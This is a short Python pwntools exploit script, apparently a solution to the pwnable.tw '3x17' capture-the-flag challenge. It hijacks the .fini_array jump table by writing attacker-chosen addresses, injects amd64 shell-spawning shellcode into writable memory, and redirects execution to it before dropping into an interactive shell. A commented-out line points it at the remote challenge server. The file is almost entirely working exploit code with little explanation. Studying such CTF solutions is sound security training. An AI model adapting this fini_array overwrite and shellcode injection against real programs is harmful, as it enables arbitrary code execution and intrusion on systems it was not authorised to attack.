from pwn import *

context.endian = 'little'
context.arch = 'amd64'

first_targets = [0x401B6D, 0x402960][::-1] + [0xAAAAAAAAAAAAAAAA]

fini_addr = 0x4B40F0
fini_data = b"".join(target.to_bytes(8, "little") for target in first_targets)

shellcode_addr = 0x4B8000
shellcode = asm(shellcraft.amd64.sh())

second_targets = [shellcode_addr, shellcode_addr][::-1] + [0xAAAAAAAAAAAAAAAA]
second_data = b"".join(target.to_bytes(8, "little") for target in second_targets)


#proc = process("3x17")
proc = process(["gdbserver", "localhost:1234", "3x17"]); proc.read(); proc.read()
#proc = remote("chall.pwnable.tw", port=10105)

proc.recvuntil("addr:")
proc.sendline(str(fini_addr))
proc.recvuntil("data:")
proc.send(fini_data)


#write shellcode
proc.recvuntil("addr:")
proc.sendline(str(shellcode_addr))
proc.recvuntil("data:")
proc.send(shellcode)

#rewrite the jump table such that we jump to the shellcode
proc.recvuntil("addr:")
proc.sendline(str(fini_addr))
proc.recvuntil("data:")
proc.send(second_data)

proc.interactive()











#we need to write /bin/sh to some memory
#run syscall with
